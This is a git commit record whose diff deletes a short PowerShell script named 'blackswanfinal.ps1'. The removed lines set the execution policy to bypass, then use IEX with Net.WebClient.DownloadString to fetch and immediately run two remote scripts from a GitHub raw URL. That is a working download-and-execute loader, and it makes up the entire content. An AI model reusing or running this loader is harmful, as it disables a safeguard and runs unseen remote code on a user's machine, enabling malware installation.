698a360381f9678c02a0050519b64e72fe8b0d54
section10housing <68567390+section10housing@users.noreply.github.com>
2020-09-26 07:16:41 +0000

    Delete blackswanfinal.ps1

--- blackswanfinal.ps1
+++
@@ -1,3 +0,0 @@
-set-executionpolicy -executionpolicy bypass -scope currentuser -force
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RFinal.ps1');
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/testconnect8.ps1')
